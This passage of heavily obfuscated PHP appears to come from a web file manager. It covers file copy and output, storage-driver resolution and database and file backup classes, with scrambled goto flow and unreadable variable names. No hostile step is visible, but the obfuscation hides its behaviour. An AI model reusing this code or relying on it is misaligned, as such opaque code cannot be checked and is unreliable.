$eãàï°Ûèä->getPathName($eãàï°Ûèä->pathThis($d¢¾²ñ¬ëÌ)); if ($aß”ë™‹) { $AÉ©ë¾‰„ = $d—¿Ç½¯åÁ->fileNameExist($bÚ†¶ĞÎÈ, $f…®Ó¢˜í·); $f…®Ó¢˜í· = $d—¿Ç½¯åÁ->fileNameAuto($bÚ†¶ĞÎÈ, $f…®Ó¢˜í·, $aß”ë™‹, !$D ƒÖ˜¡¿); $aß”ë™‹ = $AÉ©ë¾‰„ ? $aß”ë™‹ : !1; } goto b¬Îõ¹¹Ë; CÜº±ÁÑ·¢: } private static function copyFile($cÆÖ¯´†©Î, $eÎ°´Œ¶», $EÈ²ğ£œ¢•, $aÒ¶×“Õ²ã, $Dåñ÷ù…Î¼, $C¶Çœ¡ã’) { goto fŒÎÖ›½; fŒÎÖ›½: $F†ÙŠõ”ã± =& $_SERVER[‚Ğ°–—î]; $aÒ¶×“Õ²ã = $EÈ²ğ£œ¢•->getPath(rtrim($aÒ¶×“Õ²ã, $F†ÙŠõ”ã±[8]) . $F†ÙŠõ”ã±[8] . $Dåñ÷ù…Î¼); $D¾î ŸÁ = $F†ÙŠõ”ã±[1005] . time() . rand_string(5); goto fìõÁ¸œ; E˜£†‡ó„›: mk_dir($b¶§ƒêíÁœ); $cë³ùáÆê = $b¶§ƒêíÁœ . $D¾î ŸÁ; $cë³ùáÆê = $cÆÖ¯´†©Î->download($eÎ°´Œ¶», $cë³ùáÆê); goto EÈØŠ¼¸ì„; EÈØŠ¼¸ì„: $cë³ùáÆê = $cÆÖ¯´†©Î->iconvApp($cë³ùáÆê); $b¯×¥Ø‡« = $EÈ²ğ£œ¢•->upload($aÒ¶×“Õ²ã, $cë³ùáÆê, $C¶Çœ¡ã’); self::remove($b¶§ƒêíÁœ . $D¾î ŸÁ); goto bòæ§íğšæ; fìõÁ¸œ: Hook::trigger($F†ÙŠõ”ã±[1006], $cÆÖ¯´†©Î, $eÎ°´Œ¶», $EÈ²ğ£œ¢•, $aÒ¶×“Õ²ã, $Dåñ÷ù…Î¼, $D¾î ŸÁ); if (self::driverIsSame($cÆÖ¯´†©Î, $EÈ²ğ£œ¢•)) { if ($C¶Çœ¡ã’) { $b¯×¥Ø‡« = $EÈ²ğ£œ¢•->moveFile($eÎ°´Œ¶», $aÒ¶×“Õ²ã); } else { $b¯×¥Ø‡« = $EÈ²ğ£œ¢•->copyFile($eÎ°´Œ¶», $aÒ¶×“Õ²ã); } Hook::trigger($F†ÙŠõ”ã±[1007], $cÆÖ¯´†©Î, $eÎ°´Œ¶», $EÈ²ğ£œ¢•, $aÒ¶×“Õ²ã, $Dåñ÷ù…Î¼, $b¯×¥Ø‡«); return $b¯×¥Ø‡«; } $b¶§ƒêíÁœ = TEMP_FILES; goto E˜£†‡ó„›; bòæ§íğšæ: Hook::trigger($F†ÙŠõ”ã±[1007], $cÆÖ¯´†©Î, $eÎ°´Œ¶», $EÈ²ğ£œ¢•, $aÒ¶×“Õ²ã, $Dåñ÷ù…Î¼, $b¯×¥Ø‡«); return $b¯×¥Ø‡«; goto A¼ì‡ã­¯ó; A¼ì‡ã­¯ó: } public static function pathFather($FèÑ°ÏÆÌ§) { $dö‹‘ª‚§ = IO::init($FèÑ°ÏÆÌ§); $D‰‰µ˜š—‰ = $dö‹‘ª‚§->pathFather($dö‹‘ª‚§->path); return $dö‹‘ª‚§->getPathOuter($D‰‰µ˜š—‰); } public static function fileOut($Fâ²±ÕÅÃÓ, $Aï›“ñåÌ = false, $D”§’’åœÎ = false, $Fè¿Çº‚»½ = '') { $f÷¸´²¥”£ = self::driverMake($Fâ²±ÕÅÃÓ); if ($f÷¸´²¥”£->isFileOutServer()) { return $f÷¸´²¥”£->fileOutServer($Fâ²±ÕÅÃÓ, $Aï›“ñåÌ, $D”§’’åœÎ, $Fè¿Çº‚»½); } return $f÷¸´²¥”£->fileOut($Fâ²±ÕÅÃÓ, $Aï›“ñåÌ, $D”§’’åœÎ, $Fè¿Çº‚»½); } public static function fileOutImage($CÑéÕåøÚ, $aŒÅ«ù’÷ = 250) { $dº±¤êºª¢ = array(250, 600, 1200, 3000); for ($c…Ãä×º¶• = 0; $c…Ãä×º¶• < count($dº±¤êºª¢); $c…Ãä×º¶•++) { if ($c…Ãä×º¶• == 0 && $aŒÅ«ù’÷ <= $dº±¤êºª¢[$c…Ãä×º¶•]) { $aŒÅ«ù’÷ = $dº±¤êºª¢[$c…Ãä×º¶•]; break; } else { if ($aŒÅ«ù’÷ > $dº±¤êºª¢[$c…Ãä×º¶• - 1] && $aŒÅ«ù’÷ <= $dº±¤êºª¢[$c…Ãä×º¶•]) { $aŒÅ«ù’÷ = $dº±¤êºª¢[$c…Ãä×º¶•]; break; } else { if ($c…Ãä×º¶• == count($dº±¤êºª¢) - 1 && $aŒÅ«ù’÷ > $dº±¤êºª¢[$c…Ãä×º¶•]) { $aŒÅ«ù’÷ = $dº±¤êºª¢[$c…Ãä×º¶•]; break; } } } } $Aİ´ÓØíÓ  = self::driverMake($CÑéÕåøÚ); if ($Aİ´ÓØíÓ ->isFileOutServer()) { return $Aİ´ÓØíÓ ->fileOutImageServer($CÑéÕåøÚ, $aŒÅ«ù’÷); } return $Aİ´ÓØíÓ ->fileOutImage($CÑéÕåøÚ, $aŒÅ«ù’÷); } private static function driverIsSame($dç¶•Êò­Š, $aÒŒÌµÂ¢) { goto a¯Ç¤•îÅ; C²‘Àìç»¶: if ($dç¶•Êò­Š->pathDriver == $aÒŒÌµÂ¢->pathDriver) { return !0; } return !1; goto e¦Û‘ª¦ˆó; f±‚–³ï…­: if ($fç¤¿¶­ÔÍ != $d˜è¾î¬Ş) { return !1; } if ($fç¤¿¶­ÔÍ == $dîêàÁøÔ©[693]) { return !0; } if ($fç¤¿¶­ÔÍ == $dîêàÁøÔ©[102]) { return !0; } goto C²‘Àìç»¶; a¯Ç¤•îÅ: $dîêàÁøÔ© =& $_SERVER[‚Ğ°–—î]; $fç¤¿¶­ÔÍ = $dç¶•Êò­Š->getType(); $d˜è¾î¬Ş = $aÒŒÌµÂ¢->getType(); goto f±‚–³ï…­; e¦Û‘ª¦ˆó: } public static function copyUpdate($fôÀÎÏç¥«, $B˜„Ğ°²) { goto EÏÃ„•½ÆÀ; b•Æå¶×â: $Cİ÷ˆ“Å‚… = self::_listAll($fôÀÎÏç¥«); $däšº½ñŒ = self::_listAll($B˜„Ğ°²); $E¨ºİ·Ö®· = array(); goto FØˆ…è¡ì; EÏÃ„•½ÆÀ: $aƒ”ßİÙ Ö =& $_SERVER[‚Ğ°–—î]; if (!IO::exist($fôÀÎÏç¥«)) { return !1; } if (!IO::exist($B˜„Ğ°²)) { IO::mkdir($B˜„Ğ°²); } goto b•Æå¶×â; C–Ÿš¨ì«î: Hook::trigger($aƒ”ßİÙ Ö[1011], $fôÀÎÏç¥«, $B˜„Ğ°², $EˆŠ‘²ÓÄ); foreach ($D£Ú‘ñ„ô as $dôçÄáÀæ×) { IO::mkdir($dôçÄáÀæ×); } foreach ($E¨ºİ·Ö®· as $dôçÄáÀæ×) { IO::copy($dôçÄáÀæ×[$aƒ”ßİÙ Ö[1008]], $dôçÄáÀæ×[$aƒ”ßİÙ Ö[1009]], REPEAT_REPLACE); } goto fò™ŠÓ†™“; FØˆ…è¡ì: $D£Ú‘ñ„ô = array(); foreach ($Cİ÷ˆ“Å‚… as $D‡˜çĞŞ…£ => $dôçÄáÀæ×) { if (isset($däšº½ñŒ[$D‡˜çĞŞ…£])) { if ($dôçÄáÀæ×[$aƒ”ßİÙ Ö[76]] == 1) { continue; } if ($däšº½ñŒ[$D‡˜çĞŞ…£][$aƒ”ßİÙ Ö[77]] == $dôçÄáÀæ×[$aƒ”ßİÙ Ö[77]]) { continue; } } if ($dôçÄáÀæ×[$aƒ”ßİÙ Ö[76]] == 1) { $D£Ú‘ñ„ô[] = $B˜„Ğ°² . $aƒ”ßİÙ Ö[8] . $D‡˜çĞŞ…£; continue; } $c¿¶Áå´‹Ù = strstr(trim($D‡˜çĞŞ…£, $aƒ”ßİÙ Ö[8]), $aƒ”ßİÙ Ö[8]) ? get_path_father($D‡˜çĞŞ…£) : $aƒ”ßİÙ Ö[33]; $E¨ºİ·Ö®·[] = array($aƒ”ßİÙ Ö[1008] => $dôçÄáÀæ×[$aƒ”ßİÙ Ö[75]], $aƒ”ßİÙ Ö[1009] => rtrim($B˜„Ğ°², $aƒ”ßİÙ Ö[8]) . $aƒ”ßİÙ Ö[8] . $c¿¶Áå´‹Ù, $aƒ”ßİÙ Ö[1010] => $dôçÄáÀæ×); } $EˆŠ‘²ÓÄ = array($aƒ”ßİÙ Ö[167] => $E¨ºİ·Ö®·, $aƒ”ßİÙ Ö[76] => $D£Ú‘ñ„ô); goto C–Ÿš¨ì«î; fò™ŠÓ†™“: } private static function _listAll($d‹¨Ïæ«…·) { $aàÉ¦¾·¼ =& $_SERVER[‚Ğ°–—î]; $d‹¨Ïæ«…· = KodIO::clear($d‹¨Ïæ«…·); $dÕ±‘’Öì± = IO::listAll($d‹¨Ïæ«…·); foreach ($dÕ±‘’Öì± as &$bŞÄ¼– ì) { $aĞÓÂ‚§²º = substr($bŞÄ¼– ì[$aàÉ¦¾·¼[75]], strlen($d‹¨Ïæ«…·)); $bŞÄ¼– ì[$aàÉ¦¾·¼[1012]] = trim($aĞÓÂ‚§²º, $aàÉ¦¾·¼[8]); } return array_to_keyvalue($dÕ±‘’Öì±, $aàÉ¦¾·¼[1012]); } public static function fileSubstr($f‹Ô¿¿”¿‘, $f©ŠˆÒîŞº, $b–ñÓ˜œä¯ = false) { goto e™ºÈÂ‡“ƒ; fˆÌ¤”ƒø: if ($f©ŠˆÒîŞº + $b–ñÓ˜œä¯ > $eù­ÖÑìŒë) { $b–ñÓ˜œä¯ = $eù­ÖÑìŒë - $f©ŠˆÒîŞº; } if ($b–ñÓ˜œä¯ <= 0) { return $_SERVER[‚Ğ°–—î][33]; } if ($f©ŠˆÒîŞº < 0 || $f©ŠˆÒîŞº >= $eù­ÖÑìŒë || $b–ñÓ˜œä¯ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\x65\122\145\141\144\40\x65\162\x72\x6f\162\x21\40\163\164\141\x72\x74\x3d{$f©ŠˆÒîŞº}\x3b\x6c\x65\x6e\x67\x74\x68\x3d{$b–ñÓ˜œä¯}\x3b\x20\163\151\x7a\x65\x3d{$eù­ÖÑìŒë}\x3b"); } goto Fê¯×½²­ä; Fê¯×½²­ä: return $c¨„ÂëŒÁ£->fileSubstr($f‹Ô¿¿”¿‘, $f©ŠˆÒîŞº, $b–ñÓ˜œä¯); goto cÜ½Õœ‘; e™ºÈÂ‡“ƒ: $c¨„ÂëŒÁ£ = self::driverMake($f‹Ô¿¿”¿‘); $eù­ÖÑìŒë = $c¨„ÂëŒÁ£->size($f‹Ô¿¿”¿‘); $Eí’ÄÊ— = $f©ŠˆÒîŞº; goto BÆŸÖ‹ÅŞ; BÆŸÖ‹ÅŞ: $A‰íŠ¸ÍÊ¢ = $b–ñÓ˜œä¯; if ($f©ŠˆÒîŞº < 0) { $f©ŠˆÒîŞº = $eù­ÖÑìŒë + $f©ŠˆÒîŞº; } if ($b–ñÓ˜œä¯ === !1) { $b–ñÓ˜œä¯ = $eù­ÖÑìŒë - $f©ŠˆÒîŞº; } goto fˆÌ¤”ƒø; cÜ½Õœ‘: } private static function driverMake(&$bâ…âá›êğ) { goto d®é¶¤‘á; d®é¶¤‘á: $A¶è£îÚˆ =& $_SERVER[‚Ğ°–—î]; $E…³³œ = KodIO::parse($bâ…âá›êğ); if (!self::$driverListSystem) { $BŞ©‡»Â¯ = Model($A¶è£îÚˆ[703])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($BŞ©‡»Â¯, $A¶è£îÚˆ[367]); } goto FÉˆ¢ÒõÖ; FÉˆ¢ÒõÖ: if ($E…³³œ[$A¶è£îÚˆ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$E…³³œ[$A¶è£îÚˆ[367]]]) { return !1; } $bâ…âá›êğ = $E…³³œ[$A¶è£îÚˆ[1013]]; $AËé•ˆŠò = self::driverGet($E…³³œ, $bâ…âá›êğ); goto eÍöôÑá—; eÍöôÑá—: return $AËé•ˆŠò; goto d‡½–®µ†¤; d‡½–®µ†¤: } private static function driverGet($C¹ñØ”‘‡ù, &$cö¨È§½) { goto dÈÚ†òÌÙ‹; B§–İÀ¯öï: switch ($C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[29]]) { case KodIO::KOD_IO: $cªµ®„ÎÚâ = self::$driverListSystem[$Cİ‹Ù¿²‘¤]; break; case KodIO::KOD_SOURCE: $cö¨È§½ = $Cİ‹Ù¿²‘¤ . $cö¨È§½; $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1016], $EåÔ®ĞŞï§[6] => $C¹ñØ”‘‡ù); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cº¿…»¥´Ù = $GLOBALS[$EåÔ®ĞŞï§[1017]]; self::$driverListUser = array_to_keyvalue($cº¿…»¥´Ù, $EåÔ®ĞŞï§[367]); } $cªµ®„ÎÚâ = self::$driverListUser[$Cİ‹Ù¿²‘¤]; break; case KodIO::KOD_SHARE_LINK: $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1018], $EåÔ®ĞŞï§[6] => $C¹ñØ”‘‡ù); $B¡ÕÇš°ñ = Action($EåÔ®ĞŞï§[1019])->sharePathInfo($C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[75]]); $cö¨È§½ = $B¡ÕÇš°ñ[$EåÔ®ĞŞï§[369]]; if (!$B¡ÕÇš°ñ[$EåÔ®ĞŞï§[369]]) { $DÅƒ‰†¯Ë– = Model($EåÔ®ĞŞï§[536])->getInfo($B¡ÕÇš°ñ[$EåÔ®ĞŞï§[441]]); $cö¨È§½ = KodIO::clear($DÅƒ‰†¯Ë–[$EåÔ®ĞŞï§[1020]] . $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[1013]]); $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[439]] = $DÅƒ‰†¯Ë–; $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[999]] = $cö¨È§½; $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1021], $EåÔ®ĞŞï§[6] => $C¹ñØ”‘‡ù); } break; case KodIO::KOD_SHARE_ITEM: $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1022], $EåÔ®ĞŞï§[6] => $C¹ñØ”‘‡ù); $DÅƒ‰†¯Ë– = Model($EåÔ®ĞŞï§[536])->getInfo($C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[367]]); if ($DÅƒ‰†¯Ë–[$EåÔ®ĞŞï§[369]] == $EåÔ®ĞŞï§[468]) { $cö¨È§½ = KodIO::clear($DÅƒ‰†¯Ë–[$EåÔ®ĞŞï§[1020]] . $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[1013]]); $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[439]] = $DÅƒ‰†¯Ë–; $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[999]] = $cö¨È§½; $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1023], $EåÔ®ĞŞï§[6] => $C¹ñØ”‘‡ù); } else { if (!$cö¨È§½) { $cö¨È§½ = $DÅƒ‰†¯Ë–[$EåÔ®ĞŞï§[369]]; } } break; default: $cö¨È§½ = $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[75]]; $cªµ®„ÎÚâ = array($EåÔ®ĞŞï§[1015] => $EåÔ®ĞŞï§[1024]); break; } $dçÂæ »ƒ = $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[75]]; if (!isset(self::$driverCache[$dçÂæ »ƒ])) { $fõù¼â¦» = strtolower($cªµ®„ÎÚâ[$EåÔ®ĞŞï§[90]]); $cà«ĞÖ–— = $GLOBALS[$EåÔ®ĞŞï§[6]][$EåÔ®ĞŞï§[84]][$EåÔ®ĞŞï§[753]]; $D•ç°ÓŒ†” = $EåÔ®ĞŞï§[71] . (isset($cà«ĞÖ–—[$fõù¼â¦»]) ? $cà«ĞÖ–—[$fõù¼â¦»] : ucfirst($fõù¼â¦»)); if (!class_exists($D•ç°ÓŒ†”)) { show_json("{$D•ç°ÓŒ†”}\x20\x6e\157\164\x20\x65\x78\x69\x73\164\x73\x21", !1); } $b”Ó–ãÔ±§ = isset($cªµ®„ÎÚâ[$EåÔ®ĞŞï§[6]]) ? $cªµ®„ÎÚâ[$EåÔ®ĞŞï§[6]] : !1; self::$driverCache[$dçÂæ »ƒ] = new $D•ç°ÓŒ†”($b”Ó–ãÔ±§); } goto eÍ¦‘Ô‡å; CƒÕÃÉˆå£: $f¸¶³·²èñ->path = $cö¨È§½; return $f¸¶³·²èñ; goto bí§–×Ø¿; dÈÚ†òÌÙ‹: $EåÔ®ĞŞï§ =& $_SERVER[‚Ğ°–—î]; $a‰å™ù‡áº = $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[1014]]; $Cİ‹Ù¿²‘¤ = $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[367]]; goto B§–İÀ¯öï; eÍ¦‘Ô‡å: $f¸¶³·²èñ = self::$driverCache[$dçÂæ »ƒ]; $f¸¶³·²èñ->pathDriver = $a‰å™ù‡áº; $f¸¶³·²èñ->pathBase = $EåÔ®ĞŞï§[33]; goto CĞè„íø…Œ; CĞè„íø…Œ: if (isset($cªµ®„ÎÚâ[$EåÔ®ĞŞï§[6]][$EåÔ®ĞŞï§[1025]])) { $f¸¶³·²èñ->pathBase = rtrim($cªµ®„ÎÚâ[$EåÔ®ĞŞï§[6]][$EåÔ®ĞŞï§[1025]], $EåÔ®ĞŞï§[8]) . $EåÔ®ĞŞï§[8]; $cö¨È§½ = $f¸¶³·²èñ->pathBase . ltrim($cö¨È§½, $EåÔ®ĞŞï§[8]); } $cö¨È§½ = $f¸¶³·²èñ->getPath($cö¨È§½); if (isset($C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[999]])) { $cö¨È§½ = $C¹ñØ”‘‡ù[$EåÔ®ĞŞï§[999]]; } goto CƒÕÃÉˆå£; bí§–×Ø¿: } } goto E…Ìß¸ÙŞ¨; bÎİºÒÅ‚î: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto D÷ˆËó“óæ; BíÕÊèÙ: mk_dir($e§Ùƒ—Ëö); $D˜ÍÉ±Ö¹µ = $FÊÍ£ÒŠ†° = 0; $eõ¼Ü”’ÀÀ = $A–¡óÀÁ¸->db()->getTables(); goto E…Ûšæ–‡; aÂíßÍŞÔ‘: self::$name = $BÜ¹œ³à±í[$Dº—‰Ó¨Ã[28]]; $cŠ¨‹ä×š = $GLOBALS[$Dº—‰Ó¨Ã[6]][$Dº—‰Ó¨Ã[17]]; $F˜³ù‹¿¡” = $this->_dbType($cŠ¨‹ä×š); goto fŠŠ²µÂÈ½; fŠŠ²µÂÈ½: $A–¡óÀÁ¸ = new DbManage($cŠ¨‹ä×š, $F˜³ù‹¿¡”); $e§Ùƒ—Ëö = TEMP_FILES . $Dº—‰Ó¨Ã[709] . self::$name . $Dº—‰Ó¨Ã[8]; del_dir($e§Ùƒ—Ëö); goto BíÕÊèÙ; E¥µ³Àî†: Backup::set($fª­ÜÒïÇ÷); return !0; goto a›§•¡¹ÉŞ; D÷ˆËó“óæ: $Dº—‰Ó¨Ã =& $_SERVER[‚Ğ°–—î]; $BÜ¹œ³à±í = Backup::get(); self::$io = $BÜ¹œ³à±í[$Dº—‰Ó¨Ã[690]]; goto aÂíßÍŞÔ‘; E…Ûšæ–‡: $eõ¼Ü”’ÀÀ = array_diff($eõ¼Ü”’ÀÀ, array($Dº—‰Ó¨Ã[710], $Dº—‰Ó¨Ã[711])); foreach ($eõ¼Ü”’ÀÀ as $C¢‚Œ™­™š) { $D˜ÍÉ±Ö¹µ += $A–¡óÀÁ¸->model($C¢‚Œ™­™š)->count(); } $Fù¤º¯í = new Task($Dº—‰Ó¨Ã[712], $Dº—‰Ó¨Ã[713], $D˜ÍÉ±Ö¹µ, LNG($Dº—‰Ó¨Ã[714]) . $Dº—‰Ó¨Ã[715] . LNG($Dº—‰Ó¨Ã[716])); goto bÂèÒ¹Ãß; bÂèÒ¹Ãß: foreach ($eõ¼Ü”’ÀÀ as $C¢‚Œ™­™š) { $eÎÆ†ìÉ´ = $e§Ùƒ—Ëö . $C¢‚Œ™­™š . $Dº—‰Ó¨Ã[717]; $D¿ÙÑ‹í·” = null; if ($C¢‚Œ™­™š == $Dº—‰Ó¨Ã[718] && (!isset($BÜ¹œ³à±í[$Dº—‰Ó¨Ã[691]]) || $BÜ¹œ³à±í[$Dº—‰Ó¨Ã[691]] == $Dº—‰Ó¨Ã[468])) { $D¿ÙÑ‹í·” = self::$io; } $FÊÍ£ÒŠ†° += $A–¡óÀÁ¸->sqlFromDb($C¢‚Œ™­™š, $eÎÆ†ìÉ´, $Fù¤º¯í, $D¿ÙÑ‹í·”); } $Fù¤º¯í->end(); $fª­ÜÒïÇ÷ = array($Dº—‰Ó¨Ã[719] => $F˜³ù‹¿¡”, $Dº—‰Ó¨Ã[706] => 1, $Dº—‰Ó¨Ã[720] => $FÊÍ£ÒŠ†°, $Dº—‰Ó¨Ã[721] => $FÊÍ£ÒŠ†°); goto E¥µ³Àî†; a›§•¡¹ÉŞ: } private function _dbType($F‰Ÿºïƒ–) { goto d¢ ³°ĞÄ»; cÀ±”ˆî²Ø: if ($F¢…‘–õ‰ == $A‰…‡ÇÕ©æ[723]) { $E°¯“ëŞ´œ = explode($A‰…‡ÇÕ©æ[4], $F‰Ÿºïƒ–[$A‰…‡ÇÕ©æ[724]]); $F¢…‘–õ‰ = $E°¯“ëŞ´œ[0]; } $d–§Æ—¦Ğ = array($A‰…‡ÇÕ©æ[725] => $A‰…‡ÇÕ©æ[9], $A‰…‡ÇÕ©æ[726] => $A‰…‡ÇÕ©æ[727]); if (isset($d–§Æ—¦Ğ[$F¢…‘–õ‰])) { $F¢…‘–õ‰ = $d–§Æ—¦Ğ[$F¢…‘–õ‰]; } goto CÜµ¹ãšš; CÜµ¹ãšš: return $F¢…‘–õ‰; goto c±¿Ó£Ÿä; d¢ ³°ĞÄ»: $A‰…‡ÇÕ©æ =& $_SERVER[‚Ğ°–—î]; $F‰Ÿºïƒ– = array_change_key_case($F‰Ÿºïƒ–); $F¢…‘–õ‰ = $F‰Ÿºïƒ–[$A‰…‡ÇÕ©æ[722]]; goto cÀ±”ˆî²Ø; c±¿Ó£Ÿä: } } class BackupDbFile { public function __construct() { } public function index() { goto e°´ĞåÌÏ; eÜ˜èáòƒ: $eá”ç ¦¶->end(); Backup::set(array($D˜ñ‡ë[733] => $FŠğˆÌŒÄ[$D˜ñ‡ë[77]])); return !0; goto Cµ¡‚ùÙå; e°´ĞåÌÏ: $D˜ñ‡ë =& $_SERVER[‚Ğ°–—î]; $D˜ó‘¸ÀÊ‰ = Backup::get(); $Bš­‘˜Ñƒ = $D˜ó‘¸ÀÊ‰[$D˜ñ‡ë[28]]; goto BœœÍÉŠšä; D»¡È†¹Ê¤: $dùˆ‡ºĞ‚È = CONTROLLER_DIR . $D˜ñ‡ë[732]; IO::copy($cóÑ…ÉÔà¾, $f·×´­ƒ›Ó . "\x62\x61\143\153\165\x70\137{$Bš­‘˜Ñƒ}\57"); IO::copy($dùˆ‡ºĞ‚È, $f·×´­ƒ›Ó . "\x62\x61\143\x6b\165\x70\137{$Bš­‘˜Ñƒ}\57"); goto eÜ˜èáòƒ; BœœÍÉŠšä: $E²‹é¦ßî = TEMP_FILES . "\142\141\143\x6b\165\160\x5f{$Bš­‘˜Ñƒ}\57"; $f·×´­ƒ›Ó = "\x7b\151\x6f\x3a{$D˜ó‘¸ÀÊ‰[$D˜ñ‡ë[690]]}\175\57\x64\141\x74\141\142\x61\163\145\57"; IO::mkdir($f·×´­ƒ›Ó . "\142\141\x63\153\165\160\x5f{$Bš­‘˜Ñƒ}\x2f"); goto fÖï„®İÎŸ; fÖï„®İÎŸ: $eá”ç ¦¶ = new TaskFileTransfer($D˜ñ‡ë[728], $D˜ñ‡ë[713], 0, LNG($D˜ñ‡ë[714]) . $D˜ñ‡ë[412] . LNG($D˜ñ‡ë[716]) . $D˜ñ‡ë[729]); $eá”ç ¦¶->addPath($E²‹é¦ßî); $FŠğˆÌŒÄ = IO::infoWithChildren($E²‹é¦ßî); goto c‹ƒÊ¸ƒ…º; c‹ƒÊ¸ƒ…º: Backup::set(array($D˜ñ‡ë[730] => $FŠğˆÌŒÄ[$D˜ñ‡ë[77]])); IO::move($E²‹é¦ßî, $f·×´­ƒ›Ó); $cóÑ…ÉÔà¾ = CONTROLLER_DIR . $D˜ñ‡ë[731]; goto D»¡È†¹Ê¤; Cµ¡‚ùÙå: } } class BackupFile { public function __construct() { } public function index() { goto BĞ©ôâ…­ˆ; DÉÏ¢¼Íò: $CÙÓÑÉøÕ˜ = $e¤òÅĞÔ¡ ? 1 : 0; $Eè‡Âµªç” = array($_SERVER[‚Ğ°–—î][750] => 1, $_SERVER[‚Ğ°–—î][702] => time(), $_SERVER[‚Ğ°–—î][708] => $CÙÓÑÉøÕ˜, $_SERVER[‚Ğ°–—î][747] => $cÏìÉ´ªĞ, $_SERVER[‚Ğ°–—î][739] => $ağ¨Öˆñå, $_SERVER[‚Ğ°–—î][738] => $bƒ—ø«äˆÕ); if ($d÷“³ÔÎ­ô) { $Eè‡Âµªç”[$_SERVER[‚Ğ°–—î][748]] = $dë¾¨“Ö‡Ï; $Eè‡Âµªç”[$_SERVER[‚Ğ°–—î][749]] = $FÊìøó‰; } goto DÆÀµ¡¯œ; a–Úµ“Š““: $bƒ—ø«äˆÕ = (int) Model($_SERVER[‚Ğ°–—î][718])->where($cÁĞò–Ã)->count($_SERVER[‚Ğ°–—î][419]); $ağ¨Öˆñå = (int) Model($_SERVER[‚Ğ°–—î][718])->where($cÁĞò–Ã)->sum($_SERVER[‚Ğ°–—î][77]); $D—äìĞ„ã = new TaskFileTransfer($_SERVER[‚Ğ°–—î][736], $_SERVER[‚Ğ°–—î][713], $bƒ—ø«äˆÕ, LNG($_SERVER[‚Ğ°–—î][714]) . $_SERVER[‚Ğ°–—î][715] . LNG($_SERVER[‚Ğ°–—î][737])); goto aÏŸ•ˆà‡; CÛ‰Àøçèë: $Bµ„•«ßª… = 1000; $CĞ¶‹ù¹® = $d÷“³ÔÎ­ô = 0; $CùÅğ×¼êÓ = array(); goto dôêÈŠÂ‹˜; dôêÈŠÂ‹˜: $FÊìøó‰ = $dë¾¨“Ö‡Ï = 0; do { $EóÁ ‹ë‚˜ = $_SERVER[‚Ğ°–—î][740]; $Aª´ƒ¡–„ = Model($_SERVER[‚Ğ°–—î][718])->where($cÁĞò–Ã)->field($EóÁ ‹ë‚˜)->order($_SERVER[‚Ğ°–—î][741])->selectPage($Bµ„•«ßª…, $b±ƒÖ¤îÉ); $f«ä„¨³…ª = !empty($Aª´ƒ¡–„[$_SERVER[‚Ğ°–—î][354]]) ? $Aª´ƒ¡–„[$_SERVER[‚Ğ°–—î][354]] : array(); foreach ($f«ä„¨³…ª as $f„¼ãÙ–õÌ) { goto eğóÕâĞÇÅ; a‹‚‘Å£àÈ: if (IO::exist($Ašæ·ÚÇæĞ)) { $D—äìĞ„ã->updateFileEnd($f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][28]], $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][77]]); } else { $Ašæ·ÚÇæĞ = get_path_father($Ašæ·ÚÇæĞ); IO::mkdir($Ašæ·ÚÇæĞ); if (!IO::copy($bæœ«¢ã­œ, $Ašæ·ÚÇæĞ, $_SERVER[‚Ğ°–—î][744])) { write_log($_SERVER[‚Ğ°–—î][745] . $bæœ«¢ã­œ . $_SERVER[‚Ğ°–—î][746] . $Ašæ·ÚÇæĞ . $_SERVER[‚Ğ°–—î][476], $_SERVER[‚Ğ°–—î][713]); $e¤òÅĞÔ¡ = !1; break; } } $cÏìÉ´ªĞ = $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][419]]; $d÷“³ÔÎ­ô += 1; goto bŒøêäË½; bŒøêäË½: $CĞ¶‹ù¹® += $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][77]]; $dë¾¨“Ö‡Ï += 1; $FÊìøó‰ += $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][77]]; goto BĞÚäêµÆî; eğóÕâĞÇÅ: if (!$this->_fileExist($f„¼ãÙ–õÌ, $CùÅğ×¼êÓ, $BÏÈâ‡õ‘Ö)) { $bƒ—ø«äˆÕ -= 1; $ağ¨Öˆñå -= (int) $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][77]]; write_log("\146\x69\154\145\40\x6e\157\x74\40\x65\170\151\163\164\x2e\146\151\x6c\145\111\104\x3a{$f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][419]]}\x2c\x20\160\141\x74\150\x3a{$f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][75]]}", $_SERVER[‚Ğ°–—î][742]); continue; } $bæœ«¢ã­œ = $f„¼ãÙ–õÌ[$_SERVER[‚Ğ°–—î][75]]; $Ašæ·ÚÇæĞ = "\x7b\151\x6f\x3a{$dãºšŠ¿Š…[$_SERVER[‚Ğ°–—î][690]]}\175" . substr($bæœ«¢ã­œ, 